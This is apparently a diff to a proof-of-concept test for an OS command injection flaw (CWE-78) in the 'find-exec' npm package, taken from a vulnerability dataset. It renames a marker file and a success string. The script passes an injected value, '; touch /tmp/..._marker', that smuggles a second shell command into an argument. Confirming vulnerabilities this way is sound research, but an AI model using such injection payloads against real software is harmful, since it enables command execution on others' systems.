@@ -1,8 +1,8 @@
 const fs = require("fs");
 
 const target = require("../../explodejs-datasets/collected-dataset/CWE-78/find-exec-1.0.2/src");
-const markerPath = "/tmp/jsflow_report_skill_marker";
-const payload = "; touch /tmp/jsflow_report_skill_marker";
+const markerPath = "/tmp/probejs_report_skill_marker";
+const payload = "; touch /tmp/probejs_report_skill_marker";
 
 try {
   fs.unlinkSync(markerPath);
@@ -15,4 +15,4 @@ if (!fs.existsSync(markerPath)) {
 }
 
 fs.unlinkSync(markerPath);
-console.log("JSFLOW_POC_SUCCESS", result);
+console.log("PROBEJS_POC_SUCCESS", result);
